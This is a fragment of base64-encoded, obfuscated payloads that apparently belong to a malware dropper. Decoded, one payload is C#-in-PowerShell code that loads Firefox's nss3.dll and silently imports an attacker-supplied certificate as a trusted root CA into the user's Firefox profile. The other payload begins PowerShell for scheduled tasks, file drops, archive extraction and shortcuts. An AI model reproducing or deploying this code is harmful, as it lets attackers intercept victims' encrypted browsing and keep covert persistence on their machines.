XNhZ2VTU0xTZXJ2ZXJXaXRoU3RlcFVwID0gMiwKICAgICAgICBjZXJ0VXNhZ2VTU0xDQSA9IDMsCiAgICAgICAgY2VydFVzYWdlRW1haWxTaWduZXIgPSA0LAogICAgICAgIGNlcnRVc2FnZUVtYWlsUmVjaXBpZW50ID0gNSwKICAgICAgICBjZXJ0VXNhZ2VPYmplY3RTaWduZXIgPSA2LAogICAgICAgIGNlcnRVc2FnZVVzZXJDZXJ0SW1wb3J0ID0gNywKICAgICAgICBjZXJ0VXNhZ2VWZXJpZnlDQSA9IDgsCiAgICAgICAgY2VydFVzYWdlUHJvdGVjdGVkT2JqZWN0U2lnbmVyID0gOSwKICAgICAgICBjZXJ0VXNhZ2VTdGF0dXNSZXNwb25kZXIgPSAxMCwKICAgICAgICBjZXJ0VXNhZ2VBbnlDQSA9IDExCiAgICB9CglbVW5tYW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKV0KICAgIHByaXZhdGUgZGVsZWdhdGUgaW50IFlRSE5UTVhlcnFLKHN0cmluZyBzQ29uZmlnRGlyLCBzdHJpbmcgY2VydFByZWZpeCwgc3RyaW5nIGtleVByZWZpeCwgc3RyaW5nIHNlY01vZE5hbWUsIHVpbnQgZmxhZ3MpOwoKICAgIHByaXZhdGUgaW50IGlOaWhjKHN0cmluZyBzQ29uZmlnRGlyLCBzdHJpbmcgY2VydFByZWZpeCwgc3RyaW5nIGtleVByZWZpeCwgc3RyaW5nIHNlY01vZE5hbWUsIHVpbnQgZmxhZ3MpCiAgICB7CiAgICAgICAgSW50UHRyIHBQcm9jID0gR2V0UHJvY0FkZHJlc3MoZ2JJU2JKLCAiTlNTX0luaXRpYWxpemUiKTsKICAgICAgICBZUUhOVE1YZXJxSyBwdHIgPSAoWVFITlRNWGVycUspTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKFlRSE5UTVhlcnFLKSk7CiAgICAgICAgcmV0dXJuIHB0cihzQ29uZmlnRGlyLCBjZXJ0UHJlZml4LCBrZXlQcmVmaXgsIHNlY01vZE5hbWUsIGZsYWdzKTsKICAgIH0KCiAgICBbVW5tYW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKV0KICAgIHByaXZhdGUgZGVsZWdhdGUgSW50UHRyIGJNYU5Gd01IcmEoKTsKICAgIHByaXZhdGUgSW50UHRyIEFwc01uR2VlWXIoKQogICAgewogICAgICAgIEludFB0ciBwUHJvYyA9IEdldFByb2NBZGRyZXNzKGdiSVNiSiwgIkNFUlRfR2V0RGVmYXVsdENlcnREQiIpOwogICAgICAgIGJNYU5Gd01IcmEgcHRyID0gKGJNYU5Gd01IcmEpTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKGJNYU5Gd01IcmEpKTsKICAgICAgICByZXR1cm4gcHRyKCk7CiAgICB9CgogICAgW1VubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5DZGVjbCldCiAgICBwcml2YXRlIGRlbGVnYXRlIEludFB0ciBkU1goKTsKICAgIHByaXZhdGUgSW50UHRyIFVEQSgpCiAgICB7CiAgICAgICAgSW50UHRyIHBQcm9jID0gR2V0UHJvY0FkZHJlc3MoZ2JJU2JKLCAiTlNTX1NodXRkb3duIik7CiAgICAgICAgZFNYIHB0ciA9IChkU1gpTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKGRTWCkpOwogICAgICAgIHJldHVybiBwdHIoKTsKICAgIH0KCiAgICBbVW5tYW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKV0KICAgIHByaXZhdGUgZGVsZWdhdGUgaW50IFBxRWdLeE1lQUt3dFNITyhJbnRQdHIgY2VydGRiLCBpbnQgdXNhZ2UsIHVpbnQgbmNlcnRzLCByZWYgU0VDSXRlbVtdIGRlckNlcnRzLCByZWYgSW50UHRyIHJldENlcnRzLCB1aW50IGtlZXBDZXJ0cywgdWludCBjYU9ubHksIEludFB0ciBuaWNrbmFtZSk7CiAgICBwcml2YXRlIGludCBrREZ1RHZKQm4oSW50UHRyIGNlcnRkYiwgaW50IHVzYWdlLCB1aW50IG5jZXJ0cywgcmVmIFNFQ0l0ZW1bXSBkZXJDZXJ0cywgcmVmIEludFB0ciByZXRDZXJ0cywgdWludCBrZWVwQ2VydHMsIHVpbnQgY2FPbmx5LCBJbnRQdHIgbmlja25hbWUpCiAgICB7CiAgICAgICAgSW50UHRyIHBQcm9jID0gR2V0UHJvY0FkZHJlc3MoZ2JJU2JKLCAiQ0VSVF9JbXBvcnRDZXJ0cyIpOwogICAgICAgIFBxRWdLeE1lQUt3dFNITyBwdHIgPSAoUHFFZ0t4TWVBS3d0U0hPKU1hcnNoYWwuR2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIocFByb2MsIHR5cGVvZihQcUVnS3hNZUFLd3RTSE8pKTsKICAgICAgICByZXR1cm4gcHRyKGNlcnRkYiwgdXNhZ2UsIG5jZXJ0cywgcmVmIGRlckNlcnRzLCByZWYgcmV0Q2VydHMsIGtlZXBDZXJ0cywgY2FPbmx5LCBuaWNrbmFtZSk7CiAgICB9CgogICAgcHJpdmF0ZSBkZWxlZ2F0ZSBpbnQgTElRZVUoSW50UHRyIGNlcnRkYiwgSW50UHRyIGNlcnQsIHJlZiBDZXJ0VHJ1c3RzIHRydXN0KTsKICAgIHByaXZhdGUgaW50IGVvbW1sKEludFB0ciBjZXJ0ZGIsIEludFB0ciBjZXJ0LCByZWYgQ2VydFRydXN0cyB0cnVzdCkKICAgIHsKICAgICAgICBJbnRQdHIgcFByb2MgPSBHZXRQcm9jQWRkcmVzcyhnYklTYkosICJDRVJUX0NoYW5nZUNlcnRUcnVzdCIpOwogICAgICAgIExJUWVVIHB0ciA9IChMSVFlVSlNYXJzaGFsLkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKHBQcm9jLCB0eXBlb2YoTElRZVUpKTsKICAgICAgICByZXR1cm4gcHRyKGNlcnRkYiwgY2VydCwgcmVmIHRydXN0KTsKICAgIH0KCiAgICBbVW5tYW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKV0KICAgIHB1YmxpYyBkZWxlZ2F0ZSBpbnQgV3dmUndTKEludFB0ciBjZXJ0LCB1aW50IG5jZXJ0cyk7CiAgICBwcml2YXRlIGludCBSb2NSd3pqUyhJbnRQdHIgY2VydCwgdWludCBuY2VydHMpCiAgICB7CiAgICAgICAgSW50UHRyIHBQcm9jID0gR2V0UHJvY0FkZHJlc3MoZ2JJU2JKLCAiQ0VSVF9EZXN0cm95Q2VydEFycmF5Iik7CiAgICAgICAgV3dmUndTIHB0ciA9IChXd2ZSd1MpTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKFd3ZlJ3UykpOwogICAgICAgIHJldHVybiBwdHIoY2VydCwgbmNlcnRzKTsKICAgIH0KCglwcml2YXRlIEludFB0ciBnYklTYkogPSBJbnRQdHIuWmVybzsKCglwdWJsaWMgQm9vbGVhbiBEcnN3a0VoZ0FWbChTdHJpbmcgc0NlcnQpewogICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZShTdHJpbmcuRm9ybWF0KCJyV0VlUmdGU0VPIFN0YXJ0LiBQcm9jZXNzIHswfS1iaXQiLEludFB0ci5TaXplICogOCkpOwoJCVN0cmluZyBzUHJvZmlsZSA9IEdldFByb2ZpbGUoKTsKICAgICAgICBpZiAoU3RyaW5nLklzTnVsbE9yRW1wdHkoc1Byb2ZpbGUpKQogICAgICAgIHsKICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJQcm9maWxlIG5vdCBmb3VuZCIpOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiUHJvZmlsZSBwYXRoPSIrc1Byb2ZpbGUpOwogICAgICAgIGJ5dGVbXSBiQ2VydCA9IEdldENlcnRBc0J5dGVBcnJheShzQ2VydCk7CiAgICAgICAgSW50UHRyIGlwQ2VydCA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKGJDZXJ0Lkxlbmd0aCk7CiAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJVbnBhY2sgY2VydCBPSyIpOwoJCXRyeQogICAgICAgIHsKICAgICAgICAgICAgRGlyZWN0b3J5SW5mbyBkaUluc3RhbGxQYXRoID0gR2V0SVAoKTsKICAgICAgICAgICAgaWYgKGRpSW5zdGFsbFBhdGggPT0gbnVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJkaUluc3RhbGxQYXRoIGlzIG51bGwiKTsKICAgICAgICAgICAgICAgIFN0cmluZyBmZmV4ZSA9IEAiQzpcUHJvZ3JhbSBGaWxlc1xNb3ppbGxhIEZpcmVmb3hcZmlyZWZveC5leGUiOwogICAgICAgICAgICAgICAgaWYgKEZpbGUuRXhpc3RzKGZmZXhlKSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBkaUluc3RhbGxQYXRoID0gbmV3IERpcmVjdG9yeUluZm8oUGF0aC5HZXREaXJlY3RvcnlOYW1lKGZmZXhlKSk7CiAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJQYXRoIGZvdW5kOiAiK1BhdGguR2V0RGlyZWN0b3J5TmFtZShmZmV4ZSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGZmZXhlID0gQCJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXE1vemlsbGEgRmlyZWZveFxmaXJlZm94LmV4ZSI7CiAgICAgICAgICAgICAgICAgICAgaWYgKEZpbGUuRXhpc3RzKGZmZXhlKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGRpSW5zdGFsbFBhdGggPSBuZXcgRGlyZWN0b3J5SW5mbyhQYXRoLkdldERpcmVjdG9yeU5hbWUoZmZleGUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJQYXRoIGZvdW5kOiAiK1BhdGguR2V0RGlyZWN0b3J5TmFtZShmZmV4ZSkpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBTdHJpbmcgc0N1cnJlbnREaXJlY3RvcnkgPSBEaXJlY3RvcnkuR2V0Q3VycmVudERpcmVjdG9yeSgpOwogICAgICAgICAgICBEaXJlY3RvcnkuU2V0Q3VycmVudERpcmVjdG9yeShkaUluc3RhbGxQYXRoLkZ1bGxOYW1lKTsKICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJJbnN0YWxsIHBhdGg9IitkaUluc3RhbGxQYXRoLkZ1bGxOYW1lKTsKICAgICAgICAgICAgZm9yZWFjaChGaWxlSW5mbyBmaURsbCBpbiBkaUluc3RhbGxQYXRoLkdldEZpbGVzKCIqLmRsbCIpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoZmlEbGwuTmFtZS5FcXVhbHMoImJyZWFrcGFkaW5qZWN0b3IuZGxsIikpIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgdHJ5ewogICAgICAgICAgICAgICAgICAgIHR3VHN4UngoZmlEbGwuRnVsbE5hbWUpOwogICAgICAgICAgICAgICAgfWNhdGNoIChFeGNlcHRpb24gZXgpewogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZShTdHJpbmcuRm9ybWF0KCJ7MH0gezF9IHsyfSIsIGV4LlNvdXJjZSwgZXguTWVzc2FnZSwgZXguU3RhY2tUcmFjZSkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGdiSVNiSiA9IHR3VHN4UngoZGlJbnN0YWxsUGF0aC5GdWxsTmFtZSArICJcXG5zczMuZGxsIik7CiAgICAgICAgICAgIGlmIChnYklTYkouRXF1YWxzKEludFB0ci5aZXJvKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJGaXJlZm94IGluc3RhbGwgZGlyZWN0b3J5IG5vdCBmb3VuZCIpOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiSW5pdCBkbGxzIE9LIik7CiAgICAgICAgICAgIERpcmVjdG9yeS5TZXRDdXJyZW50RGlyZWN0b3J5KHNDdXJyZW50RGlyZWN0b3J5KTsKICAgICAgICAgICAgLy9Jbml0IGNlcnQKICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJDZXJ0LCAwLCBpcENlcnQsIGJDZXJ0Lkxlbmd0aCk7CiAgICAgICAgICAgIFNFQ0l0ZW0gQ2VydEl0ZW0gPSBuZXcgU0VDSXRlbSgpOwogICAgICAgICAgICBDZXJ0SXRlbS5pVHlwZSA9IDM7CiAgICAgICAgICAgIENlcnRJdGVtLmJEYXRhID0gaXBDZXJ0OwogICAgICAgICAgICBDZXJ0SXRlbS5pRGF0YUxlbiA9ICh1aW50KWJDZXJ0Lkxlbmd0aDsKICAgICAgICAgICAgU0VDSXRlbVtdIGFDZXJ0SXRlbSA9IG5ldyBTRUNJdGVtWzFdOwogICAgICAgICAgICBhQ2VydEl0ZW1bMF0gPSBDZXJ0SXRlbTsKCiAgICAgICAgICAgIENlcnRUcnVzdHMgQ2VydFRydXN0ID0gbmV3IENlcnRUcnVzdHMoKTsKICAgICAgICAgICAgQ2VydFRydXN0LmlTaXRlID0gMHgxMDsKICAgICAgICAgICAgQ2VydFRydXN0LmlFbWFpbCA9IDB4MTA7CiAgICAgICAgICAgIENlcnRUcnVzdC5pU29mdCA9IDB4MTA7CiAgICAgICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiSW5pdCBjZXJ0IE9LIik7CiAgICAgICAgICAgIC8vRW5kIGluaXQgY2VydAogICAgICAgICAgICBpbnQgc3RhdHVzID0gaU5paGMoInNxbDoiK3NQcm9maWxlLCAiIiwgIiIsIFNFQ01PRF9EQiwgTlNTX0lOSVRfT1BUSU1JWkVTUEFDRSk7CiAgICAgICAgICAgIGlmIChzdGF0dXMgIT0gWEJJYikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKFN0cmluZy5Gb3JtYXQoIk5TU19Jbml0UmVhZFdyaXRlIEVSUk9SLiBTdGF0dXM6IDB4ezA6WH07TGFzdCBlcnJvcjogMHh7MDpYfSIsIHN0YXR1cywgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKSk7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgSW50UHRyIGJkID0gQXBzTW5HZWVZcigpOwogICAgICAgICAgICBpZiAoYmQgPT0gSW50UHRyLlplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiQ0VSVF9HZXREZWZhdWx0Q2VydERCIEZhaWxlZCIpOwogICAgICAgICAgICAgICAgVURBKCk7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJDRVJUX0dldERlZmF1bHRDZXJ0REIgT0siKTsKICAgICAgICAgICAgSW50UHRyIENlcnRUb0ltcG9ydCA9IG5ldyBJbnRQdHIoKTsKICAgICAgICAgICAgSW50UHRyW10gYUNlcnRUb0ltcG9ydCA9IG5ldyBJbnRQdHJbMV07CiAgICAgICAgICAgIHN0YXR1cyA9IGtERnVEdkpCbihiZCwgMTEsIDEsIHJlZiBhQ2VydEl0ZW0sIHJlZiBDZXJ0VG9JbXBvcnQsIDEsIDAsIEludFB0ci5aZXJvKTsKICAgICAgICAgICAgaWYgKHN0YXR1cyAhPSBYQkliKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoU3RyaW5nLkZvcm1hdCgiQ0VSVF9JbXBvcnRDZXJ0cyBFUlJPUi4gU3RhdHVzOiAweHswOlh9O0xhc3QgZXJyb3I6IDB4ezA6WH0iLCBzdGF0dXMsIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSkpOwogICAgICAgICAgICAgICAgVURBKCk7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJDRVJUX0ltcG9ydENlcnRzIE9LIik7CiAgICAgICAgICAgIE1hcnNoYWwuQ29weShDZXJ0VG9JbXBvcnQsIGFDZXJ0VG9JbXBvcnQsIDAsIDEpOwogICAgICAgICAgICBzdGF0dXMgPSBlb21tbChiZCwgYUNlcnRUb0ltcG9ydFswXSwgcmVmIENlcnRUcnVzdCk7CiAgICAgICAgICAgIGlmICggc3RhdHVzICE9IFhCSWIpIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoU3RyaW5nLkZvcm1hdCgiQ0VSVF9DaGFuZ2VDZXJ0VHJ1c3QgRVJST1IuIFN0YXR1czogMHh7MDpYfTtMYXN0IGVycm9yOiAweHswOlh9Iiwgc3RhdHVzLCBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkpKTsKICAgICAgICAgICAgICAgIFVEQSgpOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9OwogICAgICAgICAgICBTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIkNFUlRfQ2hhbmdlQ2VydFRydXN0IE9LIik7CiAgICAgICAgICAgIFJvY1J3empTKENlcnRUb0ltcG9ydCwgMSk7CiAgICAgICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiQWRkIGNlcnQgT0siKTsKICAgICAgICB9CiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CiAgICAgICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZShTdHJpbmcuRm9ybWF0KCJ7MH0gezF9IHsyfSIsIGV4LlNvdXJjZSwgZXguTWVzc2FnZSwgZXguU3RhY2tUcmFjZSkpOwogICAgICAgIH0KICAgICAgICBmaW5hbGx5CiAgICAgICAgewogICAgICAgICAgICBVREEoKTsKICAgICAgICB9CgkJcmV0dXJuIHRydWU7Cgl9Cglwcml2YXRlIFN0cmluZyBHZXRQcm9maWxlKCkKICAgIHsKICAgICAgICBTdHJpbmcgRkZQcm9maWxlID0gUGF0aC5Db21iaW5lKEVudmlyb25tZW50LkdldEVudmlyb25tZW50VmFyaWFibGUoIkFQUERBVEEiKSwgQCJNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXMiKTsKICAgICAgICBpZiAoRGlyZWN0b3J5LkV4aXN0cyhGRlByb2ZpbGUpKQogICAgICAgIHsKICAgICAgICAgICAgaWYgKERpcmVjdG9yeS5HZXREaXJlY3RvcmllcyhGRlByb2ZpbGUsICIqLmRlZmF1bHQiKS5MZW5ndGggPiAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICByZXR1cm4gRGlyZWN0b3J5LkdldERpcmVjdG9yaWVzKEZGUHJvZmlsZSwgIiouZGVmYXVsdCIpWzBdOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAiIjsKICAgIH0KCXB1YmxpYyBieXRlW10gR2V0Q2VydEFzQnl0ZUFycmF5KFN0cmluZyBzQ2VydCkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoc0NlcnQpOwogICAgICAgIH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KXsKICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKFN0cmluZy5Gb3JtYXQoInswfSB7MX0gezJ9IiwgZXguU291cmNlLCBleC5NZXNzYWdlLCBleC5TdGFja1RyYWNlKSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiBudWxsOwogICAgfQoJcHJpdmF0ZSBEaXJlY3RvcnlJbmZvIEdldElQKCkKICAgIHsKICAgICAgICBEaXJlY3RvcnlJbmZvIGZwID0gbnVsbDsKICAgICAgICAvLyBnZXQgZmlyZWZveCBwYXRoIGZyb20gcmVnaXN0cnkKICAgICAgICAvLyB3ZSdsbCBzZWFyY2ggdGhlIDMyYml0IGluc3RhbGwgbG9jYXRpb24KICAgICAgICBSZWdpc3RyeUtleSBsb2NhbE1hY2hpbmUxID0gUmVnaXN0cnkuTG9jYWxNYWNoaW5lLk9wZW5TdWJLZXkoQCJTT0ZUV0FSRVxNb3ppbGxhXE1vemlsbGEgRmlyZWZveCIsIGZhbHNlKTsKICAgICAgICAvLyBhbmQgbGV0cyB0cnkgdGhlIDY0Yml0IGluc3RhbGwgbG9jYXRpb24ganVzdCBpbiBjYXNlCiAgICAgICAgUmVnaXN0cnlLZXkgbG9jYWxNYWNoaW5lMiA9IFJlZ2lzdHJ5LkxvY2FsTWFjaGluZS5PcGVuU3ViS2V5KEAiU09GVFdBUkVcV293NjQzMk5vZGVcTW96aWxsYVxNb3ppbGxhIEZpcmVmb3giLCBmYWxzZSk7CgogICAgICAgIGlmIChsb2NhbE1hY2hpbmUxICE9IG51bGwpCiAgICAgICAgewogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgc3RyaW5nW10gaW5zdGFsbGVkVmVyc2lvbnMgPSBsb2NhbE1hY2hpbmUxLkdldFN1YktleU5hbWVzKCk7CiAgICAgICAgICAgICAgICAvLyB3ZSdsbCB0YWtlIHRoZSBmaXJzdCBpbnN0YWxsZWQgdmVyc2lvbiwgcGVvcGxlIG5vcm1hbGx5IG9ubHkgaGF2ZSBvbmUKICAgICAgICAgICAgICAgIGlmIChpbnN0YWxsZWRWZXJzaW9ucy5MZW5ndGggPT0gMCkKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgSW5kZXhPdXRPZlJhbmdlRXhjZXB0aW9uKCJObyBpbnN0YWxscyBvZiBmaXJlZm94IHJlY29yZGVkIGluIGl0cyBrZXkuIik7CgogICAgICAgICAgICAgICAgUmVnaXN0cnlLZXkgbWFpbkluc3RhbGwgPSBsb2NhbE1hY2hpbmUxLk9wZW5TdWJLZXkoaW5zdGFsbGVkVmVyc2lvbnNbMF0pOwoKICAgICAgICAgICAgICAgIC8vIGdldCBpbnN0YWxsIGRpcmVjdG9yeQogICAgICAgICAgICAgICAgc3RyaW5nIGluc3RhbGxTdHJpbmcgPSAoc3RyaW5nKW1haW5JbnN0YWxsLk9wZW5TdWJLZXkoIk1haW4iKS5HZXRWYWx1ZSgiSW5zdGFsbCBEaXJlY3RvcnkiLCBudWxsKTsKCiAgICAgICAgICAgICAgICBpZiAoaW5zdGFsbFN0cmluZyA9PSBudWxsKQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBOdWxsUmVmZXJlbmNlRXhjZXB0aW9uKCJJbnN0YWxsIHN0cmluZyB3YXMgbnVsbCIpOwoKICAgICAgICAgICAgICAgIGZwID0gbmV3IERpcmVjdG9yeUluZm8oaW5zdGFsbFN0cmluZyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBleCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKFN0cmluZy5Gb3JtYXQoInswfSB7MX0gezJ9IiwgZXguU291cmNlLCBleC5NZXNzYWdlLCBleC5TdGFja1RyYWNlKSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSBpZiAobG9jYWxNYWNoaW5lMiAhPSBudWxsKQogICAgICAgIHsKICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHN0cmluZ1tdIGluc3RhbGxlZFZlcnNpb25zID0gbG9jYWxNYWNoaW5lMi5HZXRTdWJLZXlOYW1lcygpOwogICAgICAgICAgICAgICAgLy8gd2UnbGwgdGFrZSB0aGUgZmlyc3QgaW5zdGFsbGVkIHZlcnNpb24sIHBlb3BsZSBub3JtYWxseSBvbmx5IGhhdmUgb25lCiAgICAgICAgICAgICAgICBpZiAoaW5zdGFsbGVkVmVyc2lvbnMuTGVuZ3RoID09IDApCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEluZGV4T3V0T2ZSYW5nZUV4Y2VwdGlvbigiTm8gaW5zdGFsbHMgb2YgZmlyZWZveCByZWNvcmRlZCBpbiBpdHMga2V5LiIpOwoKICAgICAgICAgICAgICAgIFJlZ2lzdHJ5S2V5IG1haW5JbnN0YWxsID0gbG9jYWxNYWNoaW5lMi5PcGVuU3ViS2V5KGluc3RhbGxlZFZlcnNpb25zWzBdKTsKCiAgICAgICAgICAgICAgICAvLyBnZXQgaW5zdGFsbCBkaXJlY3RvcnkKICAgICAgICAgICAgICAgIHN0cmluZyBpbnN0YWxsU3RyaW5nID0gKHN0cmluZyltYWluSW5zdGFsbC5PcGVuU3ViS2V5KCJNYWluIikuR2V0VmFsdWUoIkluc3RhbGwgRGlyZWN0b3J5IiwgbnVsbCk7CgogICAgICAgICAgICAgICAgaWYgKGluc3RhbGxTdHJpbmcgPT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgTnVsbFJlZmVyZW5jZUV4Y2VwdGlvbigiSW5zdGFsbCBzdHJpbmcgd2FzIG51bGwiKTsKICAgICAgICAgICAgICAgIGZwID0gbmV3IERpcmVjdG9yeUluZm8oaW5zdGFsbFN0cmluZyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBleCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKFN0cmluZy5Gb3JtYXQoInswfSB7MX0gezJ9IiwgZXguU291cmNlLCBleC5NZXNzYWdlLCBleC5TdGFja1RyYWNlKSk7CiAgICAgICAgICAgIH0KICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJSZWdpc3RyeSByZWNvcmRzIG5vdCBmb3VuZCIpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZnA7CiAgICB9Cn0KIkA7CltyV0VlUmdGU0VPXTo6ZUJHZ1R3ZkxuUmlKbHkoKS5EcnN3a0VoZ0FWbCgiJUNFUlQlIik7Cn0KRm5BZVVuc1BGWmVYV3lT",
	GRtnT: "JFNIX1RZUEVfU0NIRURVTEVEX1RBU0s9MTsKJFNIX1RZUEVfVEFTS19TQ0hFRFVMRVI9MjsKJHNjaGVkdWxlclR5cGU9JFNIX1RZUEVfU0NIRURVTEVEX1RBU0s7CmZ1bmN0aW9uIEJhc2U2NFRvRmlsZQp7CnBhcmFtKFtzdHJpbmddJGZpbGUsIFtzdHJpbmddJHN0cmluZyk7CiRieXRlcz1bU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRzdHJpbmcpOwpbSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJGZpbGUsICRieXRlcyk7Cn0KZnVuY3Rpb24gRENvam1vTwp7CnBhcmFtKFtzdHJpbmddJHppcGZpbGUsIFtzdHJpbmddJGRlc3RpbmF0aW9uKTsKJDd6ID0gSm9pbi1QYXRoICRlbnY6QUxMVVNFUlNQUk9GSUxFICc3emEuZXhlJzsKaWYgKCQoVHJ5IHsgVGVzdC1QYXRoICQ3ei50cmltKCkgfSBDYXRjaCB7ICRmYWxzZSB9KSl7ClN0YXJ0LVByb2Nlc3MgIiQ3eiIgLUFyZ3VtZW50TGlzdCAieCAtb2AiJGRlc3RpbmF0aW9uYCIgLXkgYCIkemlwZmlsZWAiIiAtV2FpdCAtTm9OZXdXaW5kb3cKfQplbHNlewokc2hlbGwgPSBuZXctb2JqZWN0IC1jb20gc2hlbGwuYXBwbGljYXRpb247CiR6aXAgPSAkc2hlbGwuTmFtZVNwYWNlKCR6aXBmaWxlKTsKZm9yZWFjaCgkaXRlbSBpbiAkemlwLml0ZW1zKCkpCnsKJHNoZWxsLk5hbWVzcGFjZSgkZGVzdGluYXRpb24pLmNvcHloZXJlKCRpdGVtKTsKfQp9Cn0KCmZ1bmN0aW9uIEFkZC1TaG9ydGN1dHsKICAgIHBhcmFtKFtzdHJpbmddJHRhcmdldF9wYXRoLCBbc3RyaW5nXSRkZXN0X3BhdGgsIFtzdHJpbmddJHdvc